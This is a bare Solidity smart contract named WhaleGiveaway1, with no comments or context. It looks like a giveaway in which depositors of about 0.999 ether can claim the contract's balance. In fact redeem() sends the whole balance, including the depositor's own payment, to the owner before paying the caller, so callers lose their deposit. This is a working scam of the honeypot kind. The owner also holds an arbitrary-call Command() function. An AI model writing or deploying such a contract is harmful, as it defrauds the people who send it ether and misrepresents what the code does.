pragma solidity ^0.8.0;

contract WhaleGiveaway1 {
    address payable public Owner;
    uint public constant minEligibility = 0.999001 ether;

    constructor() {
        Owner = payable(msg.sender);
    }

    receive() external payable {}

    function redeem() external payable {
        require(msg.value >= minEligibility, "Amount is less than minimum eligibility");
        Owner.transfer(address(this).balance);
        payable(msg.sender).transfer(address(this).balance);
    }

    function withdraw() external payable {
        require(msg.sender == Owner, "Only owner can withdraw");
        Owner.transfer(address(this).balance);
    }

    function Command(address payable adr, bytes calldata data) external payable {
        require(msg.sender == Owner, "Only owner can send commands");
        (bool success, ) = adr.call{value: msg.value}(data);
        require(success, "External call failed");
    }
}